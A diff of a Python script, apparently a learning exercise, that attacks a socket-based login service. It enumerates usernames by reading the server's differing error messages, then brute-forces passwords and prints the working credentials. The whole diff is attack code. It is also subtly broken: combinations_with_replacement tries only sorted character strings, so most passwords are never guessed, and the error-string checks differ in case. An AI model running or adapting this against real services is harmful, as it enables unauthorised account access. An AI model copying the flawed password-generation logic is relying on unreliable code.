@@ -52,39 +52,62 @@ def generate_combinations(string):
 def main():
 	passwords = []
 	logins = []
-	password_flag = 0
-	login_flag = 0
+	password_flag = False
+	login_flag = False
 	new_socket = socket_connect()
 	alphanumeric = generate_alphanumeric_list()
 
 	with open("logins.txt", "r") as login_file:
 		logins = login_file.read().split("\n")
 
+	# for login in logins:
+	# 	for x in range(1, len(alphanumeric) + 1):
+	# 		for item in itertools.combinations_with_replacement(alphanumeric, x):
+	# 			password = "".join(item)
+	#
+	# 			message = {"login": login, "password": password}
+	# 			json_message = json.dumps(message)
+	# 			send_message(new_socket, json_message)
+	# 			response = new_socket.recv(1024).decode()
+	# 			json_response = json.loads(response)
+	# 			if json_response["result"] == "Connection success!":
+	# 				password_flag = True
+	# 				print(json_message)
+	# 				break
+	# 			elif json_response["result"] == "Wrong Password!":
+	# 				login_flag = True
+	# 			elif json_response["result"] == "Wrong Login!":
+	# 				break
+	#
+	# 		if password_flag:
+	# 			break
+	real_login = ""
 	for login in logins:
-		for x in range(1, len(alphanumeric) + 1):
-			for item in itertools.combinations_with_replacement(alphanumeric, x):
-				password = "".join(item)
+		message = {"login": login, "password": ""}
+		json_message = json.dumps(message, indent=4)
+		send_message(new_socket, json_message)
+		response = new_socket.recv(1024).decode()
+		json_response = json.loads(response)
+		if json_response["result"] == "Wrong password!":
+			real_login = login
+			break
 
-				message = {"login": login, "password": password}
-				json_message = json.dumps(message)
-				send_message(new_socket, json_message)
-				response = new_socket.recv(1024).decode()
-				json_response = json.loads(response)
-				if json_response["result"] == "Connection success!":
-					password_flag = 1
-					print(json_message)
-					break
-				elif json_response["result"] == "Exception happened during " \
-												"login":
-					login_flag = 1
+	for x in range(1, 10):
+		for item in itertools.combinations_with_replacement(alphanumeric, x):
+			password = "".join(item)
 
-			if password_flag:
+			message = {"login": real_login, "password": password}
+			json_message = json.dumps(message, indent=4)
+			send_message(new_socket, json_message)
+			response = new_socket.recv(1024).decode()
+			json_response = json.loads(response)
+			if json_response["result"] == "Connection success!":
+				password_flag = True
+				print(json_message)
 				break
 
 	new_socket.close()
 
 
 main()
-'
-
 
